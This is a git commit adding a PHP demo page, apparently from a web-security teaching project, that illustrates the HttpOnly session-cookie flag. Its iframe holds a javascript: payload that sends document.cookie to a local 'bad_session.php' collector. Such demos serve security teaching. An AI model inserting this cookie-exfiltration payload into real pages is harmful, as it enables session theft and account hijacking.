df7aa92e18b490933a04b7999fa076443ed46144
Io ALFANO <io.alfano@gmail.com>
2021-10-13 02:23:41 +0200

    Add session management HttpOnly

---
+++ session/vulnerable_session.php
@@ -0,0 +1,9 @@
+<html>
+<head>
+<title>Vulnerable : Session Cookie HttpOnly</title>
+</head>
+<body>
+<?php setcookie('value', 'secret_cookie', "", "", "", "", true); ?>
+<iframe src="javascript:document.location='http://localhost:8089/bad_session.php?cookie='+document.cookie"></iframe>
+</body>
+</html>
